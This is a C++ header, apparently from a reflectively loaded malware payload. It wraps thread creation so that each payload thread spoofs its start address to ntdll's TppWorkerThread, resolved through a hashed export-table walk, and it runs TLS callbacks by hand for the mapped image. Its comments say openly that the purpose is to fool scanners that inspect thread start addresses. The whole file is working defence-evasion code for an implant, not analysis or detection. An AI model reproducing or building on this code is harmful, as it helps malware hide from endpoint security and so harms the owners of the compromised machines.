// TlsThread.h -- P1-04: CreateThread wrapper + P3-03: Win32StartAddress spoof.

#pragma once
#include <windows.h>

extern HMODULE g_hSelfBase;

namespace payload {

// P3-03: Spoof Win32StartAddress of the calling thread to ntdll!TppWorkerThread.
// Called at the start of each payload thread so scanners reading thread start
// addresses see a legitimate ntdll pool thread, not the payload stub.
inline void SpoofOwnStartAddress() {
    HMODULE hNt = GetModuleHandleW(L"ntdll.dll");
    if (!hNt) return;

    // NtSetInformationThread(ThreadQuerySetWin32StartAddress=9)
    using pfnNtSIT = LONG(NTAPI*)(HANDLE, DWORD, PVOID, ULONG);
    auto NtSIT = reinterpret_cast<pfnNtSIT>(
        GetProcAddress(hNt, "NtSetInformationThread"));
    if (!NtSIT) return;

    // Resolve TppWorkerThread by walking EAT manually (DJB2 hash).
    // "TppWorkerThread" hash = same as loader's kHashTppWorker.
    auto djb2 = [](const char* s) -> uint32_t {
        uint32_t h = 5381;
        while (*s) h = h * 33u ^ (unsigned char)*s++;
        return h;
    };
    constexpr uint32_t kTarget = 0x0B8800F1u; // Djb2("TppWorkerThread") verified

    FARPROC spoof_va = nullptr;
    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(hNt);
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
            reinterpret_cast<const BYTE*>(hNt) + dos->e_lfanew);
        const auto& ee = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (ee.VirtualAddress) {
            const auto* exp = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(
                reinterpret_cast<const BYTE*>(hNt) + ee.VirtualAddress);
            const DWORD* names = reinterpret_cast<const DWORD*>(
                reinterpret_cast<const BYTE*>(hNt) + exp->AddressOfNames);
            const WORD*  ords  = reinterpret_cast<const WORD*>(
                reinterpret_cast<const BYTE*>(hNt) + exp->AddressOfNameOrdinals);
            const DWORD* funcs = reinterpret_cast<const DWORD*>(
                reinterpret_cast<const BYTE*>(hNt) + exp->AddressOfFunctions);
            for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
                const char* n = reinterpret_cast<const char*>(
                    reinterpret_cast<const BYTE*>(hNt) + names[i]);
                if (djb2(n) == kTarget) {
                    spoof_va = reinterpret_cast<FARPROC>(
                        reinterpret_cast<const BYTE*>(hNt) + funcs[ords[i]]);
                    break;
                }
            }
        }
    }
    if (!spoof_va)
        spoof_va = GetProcAddress(hNt, "RtlUserThreadStart"); // fallback
    if (!spoof_va) return;

    constexpr DWORD kInfo = 9; // ThreadQuerySetWin32StartAddress
    NtSIT(GetCurrentThread(), kInfo,
          reinterpret_cast<PVOID*>(&spoof_va), sizeof(spoof_va));
}

// Fire all TLS callbacks registered in the payload's IMAGE_TLS_DIRECTORY.
// reason: DLL_THREAD_ATTACH or DLL_THREAD_DETACH.
inline void FireTlsCallbacks(DWORD reason) {
    if (!g_hSelfBase) return;
    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(g_hSelfBase);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
    const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
        reinterpret_cast<const BYTE*>(g_hSelfBase) + dos->e_lfanew);
    const auto& tls_e = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!tls_e.VirtualAddress || tls_e.Size < sizeof(IMAGE_TLS_DIRECTORY)) return;
    const auto* tls = reinterpret_cast<const IMAGE_TLS_DIRECTORY*>(
        reinterpret_cast<const BYTE*>(g_hSelfBase) + tls_e.VirtualAddress);
    if (!tls->AddressOfCallBacks) return;
    auto* cb = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(tls->AddressOfCallBacks);
    while (cb && *cb) {
        (*cb)(g_hSelfBase, reason, nullptr);
        ++cb;
    }
}

struct TlsThreadCtx {
    LPTHREAD_START_ROUTINE fn;
    LPVOID                 arg;
};

static DWORD WINAPI TlsThreadEntry(LPVOID raw) {
    auto* ctx = reinterpret_cast<TlsThreadCtx*>(raw);
    auto fn   = ctx->fn;
    auto arg  = ctx->arg;
    delete ctx;

    SpoofOwnStartAddress();          // P3-03: spoof before any scanner samples
    FireTlsCallbacks(DLL_THREAD_ATTACH);
    DWORD ret = fn(arg);
    FireTlsCallbacks(DLL_THREAD_DETACH);
    return ret;
}

// Drop-in replacement for CreateThread in the payload.
inline HANDLE TlsThreadCreate(LPTHREAD_START_ROUTINE fn, LPVOID arg,
                               HANDLE* out_id = nullptr) {
    auto* ctx = new (std::nothrow) TlsThreadCtx{fn, arg};
    if (!ctx) return nullptr;
    DWORD id = 0;
    HANDLE h = CreateThread(nullptr, 0, TlsThreadEntry, ctx, 0, &id);
    if (!h) { delete ctx; return nullptr; }
    if (out_id) *out_id = reinterpret_cast<HANDLE>(static_cast<uintptr_t>(id));
    return h;
}

} // namespace payload
